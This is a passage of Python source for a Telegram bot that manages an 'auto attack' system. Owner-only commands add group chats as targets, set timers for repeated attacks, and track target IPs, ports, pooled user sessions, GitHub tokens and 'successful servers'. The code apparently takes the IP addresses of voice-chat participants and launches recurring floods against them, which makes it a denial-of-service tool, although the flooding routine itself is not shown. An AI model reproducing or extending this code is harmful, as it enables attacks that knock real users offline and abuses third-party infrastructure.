                f"┃  {str(e)[:28]:<30}┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )
            if user_id in temp_data:
                del temp_data[user_id]

    # ─────────────────────────────────────────────────────────────
    #  🛑   P A U S E   T A R G E T
    # ─────────────────────────────────────────────────────────────
    elif step == "ip_auto_attack_stop":
        cid = text.strip()
        if cid not in auto_attack_targets:
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ɴᴏᴛ ɪɴ ʟɪꜱᴛ                ║\n"
                "╚════════════════════════════════╝"
            )
            del temp_data[user_id]
            return

        auto_attack_targets[cid]["enabled"] = False
        save_auto_attacks()
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  ⏸️  ᴛᴀʀɢᴇᴛ ᴘᴀᴜꜱᴇᴅ            ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  🆔 `{cid}`\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
            reply_markup=get_auto_attack_keyboard()
        )
        del temp_data[user_id]

    # ─────────────────────────────────────────────────────────────
    #  ▶️   R E S U M E   T A R G E T
    # ─────────────────────────────────────────────────────────────
    elif step == "ip_auto_attack_resume":
        cid = text.strip()
        if cid not in auto_attack_targets:
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ɴᴏᴛ ɪɴ ʟɪꜱᴛ                ║\n"
                "╚════════════════════════════════╝"
            )
            del temp_data[user_id]
            return

        auto_attack_targets[cid]["enabled"] = True
        save_auto_attacks()

        if AUTO_ATTACK_LOOP_TASK is None or AUTO_ATTACK_LOOP_TASK.done():
            AUTO_ATTACK_LOOP_TASK = asyncio.create_task(auto_attack_loop())

        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  ▶️  ᴛᴀʀɢᴇᴛ ʀᴇꜱᴜᴍᴇᴅ           ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  🆔 `{cid}`\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
            reply_markup=get_auto_attack_keyboard()
        )
        del temp_data[user_id]

    # ─────────────────────────────────────────────────────────────
    #  ❌   R E M O V E   T A R G E T
    # ─────────────────────────────────────────────────────────────
    elif step == "ip_auto_attack_remove":
        cid = text.strip()
        if cid not in auto_attack_targets:
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ɴᴏᴛ ɪɴ ʟɪꜱᴛ                ║\n"
                "╚════════════════════════════════╝"
            )
            del temp_data[user_id]
            return

        title = auto_attack_targets[cid].get("chat_title", "Unknown")
        del auto_attack_targets[cid]
        save_auto_attacks()

        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  ✅  ᴛᴀʀɢᴇᴛ ʀᴇᴍᴏᴠᴇᴅ           ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  💬 {title[:22]}\n"
            f"┃  🆔 `{cid}`\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
            reply_markup=get_auto_attack_keyboard()
        )
        del temp_data[user_id]

    # ─────────────────────────────────────────────────────────────
    #  🔄   R E S E T   B A N N E D
    # ─────────────────────────────────────────────────────────────
    elif step == "ip_auto_attack_reset_banned":
        cid = text.strip()
        if cid not in auto_attack_targets:
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ɴᴏᴛ ɪɴ ʟɪꜱᴛ                ║\n"
                "╚════════════════════════════════╝"
            )
            del temp_data[user_id]
            return

        old = len(auto_attack_targets[cid].get("banned_sessions", []))
        auto_attack_targets[cid]["banned_sessions"] = []
        auto_attack_targets[cid]["enabled"] = True
        save_auto_attacks()

        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  🔄  ʙᴀɴɴᴇᴅ ʀᴇꜱᴇᴛ             ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  🆔 `{cid}`\n"
            f"┃  ♻️ ᴄʟᴇᴀʀᴇᴅ {old} ꜱᴇꜱꜱɪᴏɴꜱ\n"
            "┃  🟢 ᴛᴀʀɢᴇᴛ ʀᴇ-ᴇɴᴀʙʟᴇᴅ         ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
            reply_markup=get_auto_attack_keyboard()
        )
        del temp_data[user_id]

    # ─────────────────────────────────────────────────────────────
    #  ⏱️   T I M E R   —   S T E P   1 / 3   (chat input)
    # ─────────────────────────────────────────────────────────────
    elif step == "ip_auto_timer_chat":
        chat_input = text.strip()
        session_name = get_random_ip_session()

        if not session_name:
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ɴᴏ ꜱᴇꜱꜱɪᴏɴꜱ                ║\n"
                "╚════════════════════════════════╝"
            )
            del temp_data[user_id]
            return

        try:
            client = await get_ip_client(session_name)
            if not client:
                await update.message.reply_text("❌ Session unavailable.")
                del temp_data[user_id]
                return

            chat = await resolve_ip_chat(client, chat_input)
            chat_id_str = str(chat.id)

            if chat_id_str in auto_attack_targets:
                await update.message.reply_text(
                    "╔════════════════════════════════╗\n"
                    "║  ⚠️  ᴀʟʀᴇᴀᴅʏ ᴇxɪꜱᴛꜱ            ║\n"
                    "╚════════════════════════════════╝"
                )
                del temp_data[user_id]
                return

            temp_data[user_id] = {
                "step": "ip_auto_timer_interval",
                "chat_id": chat.id,
                "chat_id_str": chat_id_str,
                "chat_title": chat.title or "Unknown",
                "session_name": session_name,
            }
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ⏱️  ᴛɪᴍᴇʀ - 2/3               ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  💬 {chat.title or 'Unknown'}\n"
                f"┃  🆔 `{chat_id_str}`\n"
                "┠────────────────────────────────┨\n"
                "┃  ⏳ ꜱᴇɴᴅ ɪɴᴛᴇʀᴠᴀʟ (ꜱᴇᴄᴏɴᴅꜱ)    ┃\n"
                "┃                                ┃\n"
                "┃  ᴇxᴀᴍᴘʟᴇ: `60`                ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                reply_markup=get_cancel_keyboard()
            )
        except Exception as e:
            logger.error(f"timer setup error: {e}")
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ᴇʀʀᴏʀ                      ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  {str(e)[:28]:<30}┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )
            if user_id in temp_data:
                del temp_data[user_id]

    # ─────────────────────────────────────────────────────────────
    #  ⏱️   T I M E R   —   S T E P   2 / 3   (interval)
    # ─────────────────────────────────────────────────────────────
    elif step == "ip_auto_timer_interval":
        try:
            interval = int(text.strip())
            if interval < 10:
                await update.message.reply_text(
                    "╔════════════════════════════════╗\n"
                    "║  ❌  ᴛᴏᴏ ꜱʜᴏʀᴛ                  ║\n"
                    "╚════════════════════════════════╝\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃  ⏳ ᴍɪɴɪᴍᴜᴍ 10 ꜱᴇᴄᴏɴᴅꜱ.        ┃\n"
                    "┃  📎 ꜱᴇɴᴅ ᴀ ʟᴀʀɢᴇʀ ɴᴜᴍʙᴇʀ.    ┃\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
                )
                return

            temp_data[user_id]["interval"] = interval
            temp_data[user_id]["step"] = "ip_auto_timer_duration"

            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ⏱️  ᴛɪᴍᴇʀ - 3/3               ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  ✅ ɪɴᴛᴇʀᴠᴀʟ: `{interval}s`\n"
                "┠────────────────────────────────┨\n"
                "┃  ⏳ ꜱᴇɴᴅ ᴛᴏᴛᴀʟ ᴅᴜʀᴀᴛɪᴏɴ        ┃\n"
                "┃                                ┃\n"
                "┃  • `60s` = 60 ꜱᴇᴄ             ┃\n"
                "┃  • `30m` = 30 ᴍɪɴ             ┃\n"
                "┃  • `2h`  = 2 ʜᴏᴜʀꜱ            ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                reply_markup=get_cancel_keyboard()
            )
        except ValueError:
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ             ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  📎 ꜱᴇɴᴅ ᴀ ᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ.       ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )

    # ─────────────────────────────────────────────────────────────
    #  ⏱️   T I M E R   —   S T E P   3 / 3   (duration)
    # ─────────────────────────────────────────────────────────────
    elif step == "ip_auto_timer_duration":
        duration_str = text.strip().lower()
        try:
            if duration_str.endswith("s"):
                total_dur = int(duration_str[:-1])
            elif duration_str.endswith("m"):
                total_dur = int(duration_str[:-1]) * 60
            elif duration_str.endswith("h"):
                total_dur = int(duration_str[:-1]) * 3600
            elif duration_str.isdigit():
                total_dur = int(duration_str)
            else:
                await update.message.reply_text(
                    "╔════════════════════════════════╗\n"
                    "║  ❌  ɪɴᴠᴀʟɪᴅ ꜰᴏʀᴍᴀᴛ             ║\n"
                    "╚════════════════════════════════╝\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃  📎 ᴜꜱᴇ: 60s / 30m / 2h        ┃\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
                )
                return
        except ValueError:
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ɪɴᴠᴀʟɪᴅ ᴅᴜʀᴀᴛɪᴏɴ           ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  📎 ᴜꜱᴇ: 60s / 30m / 2h        ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )
            return

        data = temp_data[user_id]
        interval = data["interval"]
        if total_dur < interval:
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ᴛᴏᴏ ꜱʜᴏʀᴛ                  ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  ⏳ ᴅᴜʀᴀᴛɪᴏɴ ᴍᴜꜱᴛ ʙᴇ ɢʀᴇᴀᴛᴇʀ  ┃\n"
                "┃     ᴛʜᴀɴ ɪɴᴛᴇʀᴠᴀʟ.            ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )
            return

        max_atk = total_dur // interval
        chat_id_str = data["chat_id_str"]

        auto_attack_targets[chat_id_str] = {
            "chat_id": data["chat_id"],
            "chat_title": data["chat_title"],
            "session_name": data["session_name"],
            "enabled": True,
            "mode": "timer",
            "interval": interval,
            "max_attacks": max_atk,
            "total_duration": total_dur,
            "started_at": time.time(),
            "banned_sessions": [],
            "attack_duration": AUTO_ATTACK_DEFAULT_DURATION,
            "attack_count": 0,
            "last_ip": None, "last_port": None,
            "last_attack_time": None,
            "last_success_servers": 0,
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        save_auto_attacks()

        if AUTO_ATTACK_LOOP_TASK is None or AUTO_ATTACK_LOOP_TASK.done():
            AUTO_ATTACK_LOOP_TASK = asyncio.create_task(auto_attack_loop())

        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  ✅  ᴛɪᴍᴇʀ ᴏɴ!                  ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  🎯 ᴍᴏᴅᴇ: ⏱️ ᴛɪᴍᴇʀ              ┃\n"
            "┠────────────────────────────────┨\n"
            f"┃  💬 {data['chat_title'][:22]}\n"
            f"┃  🆔 `{chat_id_str}`\n"
            f"┃  🔄 ɪɴᴛᴇʀᴠᴀʟ: `{interval}s`\n"
            f"┃  ⏳ ᴅᴜʀᴀᴛɪᴏɴ: `{total_dur}s`\n"
            f"┃  🎯 ᴍᴀx ᴀᴛᴛᴀᴄᴋꜱ: `{max_atk}`\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
            reply_markup=get_auto_attack_keyboard()
        )
        del temp_data[user_id]

# ═══════════════════════════════════════════════════════════════════
#         ⚡   A U T O   A T T A C K   C O M M A N D S   ⚡
#         /autovc  /autotime  /autoattacks  /autostatus
#         /removeauto  /stopauto  /startauto
# ═══════════════════════════════════════════════════════════════════


# ─────────────────────────────────────────────────────────────────
#  🎙️   / a u t o v c   < g r o u p _ l i n k >
# ─────────────────────────────────────────────────────────────────
async def autovc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Quick-add a detector-mode target. Usage: /autovc <group_link>"""
    global AUTO_ATTACK_LOOP_TASK
    user_id = update.effective_user.id

    if not is_owner(user_id):
        return

    if not PYROGRAM_AVAILABLE or not ip_accounts or not github_tokens:
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  ⚠️  ꜱᴇᴛᴜᴘ ɪɴᴄᴏᴍᴘʟᴇᴛᴇ         ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ✅ ᴘʏʀᴏɢʀᴀᴍ ɪɴꜱᴛᴀʟʟᴇᴅ      ┃\n"
            "┃  ✅ ᴀᴛ ʟᴇᴀꜱᴛ 1 ꜱᴇꜱꜱɪᴏɴ      ┃\n"
            "┃  ✅ ᴀᴛ ʟᴇᴀꜱᴛ 1 ᴛᴏᴋᴇɴ        ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )
        return

    if not context.args:
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  🎙️  ᴀᴜᴛᴏ ᴠᴄ ᴅᴇᴛᴇᴄᴛᴏʀ         ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  📖 ᴜꜱᴀɢᴇ:                     ┃\n"
            "┃     `/autovc <group_link>`     ┃\n"
            "┠────────────────────────────────┨\n"
            "┃  📎 ᴇxᴀᴍᴘʟᴇ:                   ┃\n"
            "┃     `https://t.me/+xxxxx`      ┃\n"
            "┃     `@groupname`               ┃\n"
            "┃     `-1001234567890`           ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )
        return

    link = context.args[0].strip()
    if not (link.startswith("https://t.me/") or link.startswith("@") or link.startswith("-100")):
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  ❌  ɪɴᴠᴀʟɪᴅ ʟɪɴᴋ              ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  📎 ᴀᴄᴄᴇᴘᴛᴇᴅ ꜰᴏʀᴍᴀᴛꜱ:         ┃\n"
            "┃     `https://t.me/+xxx`        ┃\n"
            "┃     `@groupname`               ┃\n"
            "┃     `-100…`                    ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )
        return

    if len(auto_attack_targets) >= 20:
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  ⚠️  ᴛᴀʀɢᴇᴛ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ       ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  📋 ᴄᴜʀʀᴇɴᴛ: {len(auto_attack_targets):<17}┃\n"
            "┃  🔒 ᴍᴀxɪᴍᴜᴍ: 20                ┃\n"
            "┠────────────────────────────────┨\n"
            "┃  🗑️ ʀᴇᴍᴏᴠᴇ ᴀ ᴛᴀʀɢᴇᴛ ꜰɪʀꜱᴛ.   ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )
        return

    session_name = get_random_ip_session()
    msg = await update.message.reply_text(
        "╔════════════════════════════════╗\n"
        "║  ⚡  ʀᴇꜱᴏʟᴠɪɴɢ...              ║\n"
        "╚════════════════════════════════╝\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  📁 ᴜꜱɪɴɢ: `{session_name}`\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
    )

    try:
        client = await get_ip_client(session_name)
        if not client:
            await msg.edit_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ꜱᴇꜱꜱɪᴏɴ ᴜɴᴀᴠᴀɪʟᴀʙʟᴇ      ║\n"
                "╚════════════════════════════════╝"
            )
            return

        chat = await resolve_ip_chat(client, link)
        chat_id_str = str(chat.id)
        chat_title = chat.title or "Unknown"

        if chat_id_str in auto_attack_targets:
            await msg.edit_text(
                "╔════════════════════════════════╗\n"
                "║  ⚠️  ᴀʟʀᴇᴀᴅʏ ᴇxɪꜱᴛꜱ            ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  💬 {chat_title[:22]}\n"
                f"┃  🆔 `{chat_id_str}`\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )
            return

        auto_attack_targets[chat_id_str] = {
            "chat_id": chat.id,
            "chat_title": chat_title,
            "session_name": session_name,
            "enabled": True,
            "mode": "detector",
            "banned_sessions": [],
            "attack_duration": AUTO_ATTACK_DEFAULT_DURATION,
            "attack_count": 0,
            "last_ip": None, "last_port": None,
            "last_attack_time": None,
            "last_attack_method": None,
            "last_success_servers": 0,
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        save_auto_attacks()

        if AUTO_ATTACK_LOOP_TASK is None or AUTO_ATTACK_LOOP_TASK.done():
            AUTO_ATTACK_LOOP_TASK = asyncio.create_task(auto_attack_loop())

        await msg.edit_text(
            "╔════════════════════════════════╗\n"
            "║  ✅  ᴀᴜᴛᴏ-ᴠᴄ ᴏɴ!              ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  🎯 ᴍᴏᴅᴇ: 🔍 ᴅᴇᴛᴇᴄᴛᴏʀ         ┃\n"
            "┠────────────────────────────────┨\n"
            f"┃  💬 {chat_title[:22]}\n"
            f"┃  🆔 `{chat_id_str}`\n"
            f"┃  📁 `{session_name}`\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )

    except Exception as e:
        await msg.edit_text(
            "╔════════════════════════════════╗\n"
            "║  ❌  ᴇʀʀᴏʀ                      ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  {str(e)[:28]:<30}┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )


# ─────────────────────────────────────────────────────────────────
#  ⏱️   / a u t o t i m e   < l i n k >   < i n t >   < d u r >
# ─────────────────────────────────────────────────────────────────
async def autotime_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Quick-add a timer-mode target. Usage: /autotime <link> <int> <dur>"""
    global AUTO_ATTACK_LOOP_TASK
    user_id = update.effective_user.id

    if not is_owner(user_id):
        return

    if not PYROGRAM_AVAILABLE or not ip_accounts or not github_tokens:
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  ⚠️  ꜱᴇᴛᴜᴘ ɪɴᴄᴏᴍᴘʟᴇᴛᴇ         ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ✅ ᴘʏʀᴏɢʀᴀᴍ ɪɴꜱᴛᴀʟʟᴇᴅ      ┃\n"
            "┃  ✅ ᴀᴛ ʟᴇᴀꜱᴛ 1 ꜱᴇꜱꜱɪᴏɴ      ┃\n"
            "┃  ✅ ᴀᴛ ʟᴇᴀꜱᴛ 1 ᴛᴏᴋᴇɴ        ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )
        return

    if len(context.args) < 3:
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  ⏱️  ᴀᴜᴛᴏ ᴛɪᴍᴇʀ                ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  📖 ᴜꜱᴀɢᴇ:                     ┃\n"
            "┃     `/autotime <link> <int> <dur>`┃\n"
            "┠────────────────────────────────┨\n"
            "┃  📎 ᴇxᴀᴍᴘʟᴇ:                   ┃\n"
            "┃     `/autotime https://t.me/+x 60 30m`┃\n"
            "┠────────────────────────────────┨\n"
            "┃  ⏳ ᴅᴜʀᴀᴛɪᴏɴ ꜰᴏʀᴍᴀᴛ:           ┃\n"
            "┃     `60s` · `30m` · `2h`        ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )
        return

    link = context.args[0].strip()

    # ── interval ──
    try:
        interval = int(context.args[1])
    except ValueError:
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  ❌  ɪɴᴠᴀʟɪᴅ ɪɴᴛᴇʀᴠᴀʟ           ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  🔢 ɪɴᴛᴇʀᴠᴀʟ ᴍᴜꜱᴛ ʙᴇ ᴀ       ┃\n"
            "┃     ɴᴜᴍʙᴇʀ (ꜱᴇᴄᴏɴᴅꜱ).         ┃\n"
            "┃                                ┃\n"
            "┃  📎 ᴇxᴀᴍᴘʟᴇ: `60`             ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )
        return

    # ── duration ──
    dur_str = context.args[2].lower()
    try:
        if dur_str.endswith("s"):
            total_dur = int(dur_str[:-1])
        elif dur_str.endswith("m"):
            total_dur = int(dur_str[:-1]) * 60
        elif dur_str.endswith("h"):
            total_dur = int(dur_str[:-1]) * 3600
        elif dur_str.isdigit():
            total_dur = int(dur_str)
        else:
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ɪɴᴠᴀʟɪᴅ ꜰᴏʀᴍᴀᴛ             ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  📎 ᴜꜱᴇ: 60s / 30m / 2h        ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )
            return
    except ValueError:
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  ❌  ɪɴᴠᴀʟɪᴅ ᴅᴜʀᴀᴛɪᴏɴ           ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  📎 ᴜꜱᴇ: 60s / 30m / 2h        ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )
        return

    # ── logical validation ──
    if interval < 10 or total_dur < interval:
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  ❌  ɪɴᴠᴀʟɪᴅ ᴠᴀʟᴜᴇꜱ             ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⏳ ᴍɪɴ ɪɴᴛᴇʀᴠᴀʟ: `10s`         ┃\n"
            "┃  ⏳ ᴅᴜʀᴀᴛɪᴏɴ > ɪɴᴛᴇʀᴠᴀʟ      ┃\n"
            "┠────────────────────────────────┨\n"
            f"┃  🔎 ʏᴏᴜʀꜱ: {interval}s / {total_dur}s\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )
        return

    session_name = get_random_ip_session()
    msg = await update.message.reply_text(
        "╔════════════════════════════════╗\n"
        "║  ⚡  ʀᴇꜱᴏʟᴠɪɴɢ...              ║\n"
        "╚════════════════════════════════╝\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  📁 ᴜꜱɪɴɢ: `{session_name}`\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
    )

    try:
        client = await get_ip_client(session_name)
        chat = await resolve_ip_chat(client, link)
        chat_id_str = str(chat.id)
        chat_title = chat.title or "Unknown"

        if chat_id_str in auto_attack_targets:
            await msg.edit_text(
                "╔════════════════════════════════╗\n"
                "║  ⚠️  ᴀʟʀᴇᴀᴅʏ ᴇxɪꜱᴛꜱ            ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  💬 {chat_title[:22]}\n"
                f"┃  🆔 `{chat_id_str}`\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )
            return

        max_atk = total_dur // interval

        auto_attack_targets[chat_id_str] = {
            "chat_id": chat.id,
            "chat_title": chat_title,
            "session_name": session_name,
            "enabled": True,
            "mode": "timer",
            "interval": interval,
            "max_attacks": max_atk,
            "total_duration": total_dur,
            "started_at": time.time(),
            "banned_sessions": [],
            "attack_duration": AUTO_ATTACK_DEFAULT_DURATION,
            "attack_count": 0,
            "last_ip": None, "last_port": None,
            "last_attack_time": None,
            "last_success_servers": 0,
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        save_auto_attacks()

        if AUTO_ATTACK_LOOP_TASK is None or AUTO_ATTACK_LOOP_TASK.done():
            AUTO_ATTACK_LOOP_TASK = asyncio.create_task(auto_attack_loop())

        await msg.edit_text(
            "╔════════════════════════════════╗\n"
            "║  ✅  ᴛɪᴍᴇʀ ᴏɴ!                  ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  🎯 ᴍᴏᴅᴇ: ⏱️ ᴛɪᴍᴇʀ              ┃\n"
            "┠────────────────────────────────┨\n"
            f"┃  💬 {chat_title[:22]}\n"
            f"┃  🆔 `{chat_id_str}`\n"
            "┠────────────────────────────────┨\n"
            f"┃  🔄 ɪɴᴛᴇʀᴠᴀʟ: `{interval}s`\n"
            f"┃  ⏳ ᴅᴜʀᴀᴛɪᴏɴ: `{total_dur}s`\n"
            f"┃  🎯 ᴍᴀx ᴀᴛᴛᴀᴄᴋꜱ: `{max_atk}`\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )

    except Exception as e:
        await msg.edit_text(
            "╔════════════════════════════════╗\n"
            "║  ❌  ᴇʀʀᴏʀ                      ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  {str(e)[:28]:<30}┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )


# ─────────────────────────────────────────────────────────────────
#  📋   / a u t o a t t a c k s
# ─────────────────────────────────────────────────────────────────
async def autoattacks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Display all auto-attack targets (compact list)."""
    if not is_owner(update.effective_user.id):
        return

    if not auto_attack_targets:
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  📭  ɴᴏ ᴀᴄᴛɪᴠᴇ ᴛᴀʀɢᴇᴛꜱ         ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  💡 ᴜꜱᴇ /autovc ᴏʀ /autotime   ┃\n"
            "┃     ᴛᴏ ꜱᴛᴀʀᴛ ᴀ ᴛᴀʀɢᴇᴛ.         ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )
        return

    text = (
        "╔════════════════════════════════╗\n"
        "║   💀  ᴀᴜᴛᴏ ᴀᴛᴛᴀᴄᴋ ʟɪꜱᴛ  💀   ║\n"
        "╚════════════════════════════════╝\n"
    )

    for i, (cid, t) in enumerate(auto_attack_targets.items(), 1):
        status = "🟢" if t.get("enabled", True) else "🔴"
        mode = (
            "🔍 DETECTOR"
            if t.get("mode", "detector") != "timer"
            else "⏱️ TIMER"
        )
        banned = len(t.get("banned_sessions", []))

        text += "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        text += f"┃  {status} #{i}  [{mode}]\n"
        text += f"┃  💬 {t.get('chat_title', '?')[:22]}\n"
        text += "┠────────────────────────────────┨\n"
